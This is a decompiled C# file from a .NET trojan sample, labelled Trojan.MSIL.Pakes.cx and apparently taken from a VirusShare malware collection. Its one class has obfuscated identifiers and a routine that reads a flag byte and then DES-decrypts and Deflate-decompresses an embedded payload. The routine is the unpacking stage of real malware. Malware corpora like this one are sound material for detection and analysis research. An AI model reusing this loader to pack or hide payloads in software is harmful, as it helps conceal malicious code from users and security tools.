// Decompiled with JetBrains decompiler
// Type: A.cd7d39555ed815bdbdf6dbdcced0251b4
// Assembly: net, Version=15.4.3508.1109, Culture=neutral, PublicKeyToken=null
// MVID: A137FCB5-FE00-42D4-8178-C1BBFD9418C8
// Assembly location: C:\Users\Administrateur\Downloads\Virusshare-00001-msil\Trojan.MSIL.Pakes.cx-23a264c6feb6b4bc57f469957ada226bb861d6f4ace142613d18e30195c1e926.exe

using System;
using System.IO;
using System.IO.Compression;
using System.Reflection;
using System.Security.Cryptography;

namespace A
{
  internal class cd7d39555ed815bdbdf6dbdcced0251b4
  {
    internal static byte[] cacebd254633b7d2e2214cba5e36683c9(
      Stream c402977331e6b2a05cd4477a9e61e3145)
    {
      byte num1 = (byte) c402977331e6b2a05cd4477a9e61e3145.ReadByte();
      byte[] numArray = new byte[c402977331e6b2a05cd4477a9e61e3145.Length - 1L];
      c402977331e6b2a05cd4477a9e61e3145.Read(numArray, 0, numArray.Length);
      if (((int) num1 & 1) != 0)
      {
        DESCryptoServiceProvider cryptoServiceProvider = new DESCryptoServiceProvider();
        byte[] dst1 = new byte[8];
        Buffer.BlockCopy((Array) numArray, 0, (Array) dst1, 0, 8);
        cryptoServiceProvider.IV = dst1;
        byte[] dst2 = new byte[8];
        Buffer.BlockCopy((Array) numArray, 8, (Array) dst2, 0, 8);
        bool flag = true;
        foreach (byte num2 in dst2)
        {
          if (num2 != (byte) 0)
          {
            flag = false;
            break;
          }
        }
        if (flag)
          dst2 = Assembly.GetExecutingAssembly().GetName().GetPublicKeyToken();
        cryptoServiceProvider.Key = dst2;
        numArray = cryptoServiceProvider.CreateDecryptor().TransformFinalBlock(numArray, 16, numArray.Length - 16);
      }
      if (((int) num1 & 2) != 0)
      {
        try
        {
          MemoryStream memoryStream1 = new MemoryStream(numArray);
          DeflateStream deflateStream = new DeflateStream((Stream) memoryStream1, CompressionMode.Decompress);
          MemoryStream memoryStream2 = new MemoryStream((int) memoryStream1.Length * 2);
          int count1 = 1000;
          byte[] buffer = new byte[count1];
          int count2;
          do
          {
            count2 = deflateStream.Read(buffer, 0, count1);
            if (count2 > 0)
              memoryStream2.Write(buffer, 0, count2);
          }
          while (count2 >= count1);
          numArray = memoryStream2.ToArray();
        }
        catch (Exception ex)
        {
        }
      }
      return numArray;
    }
  }
}
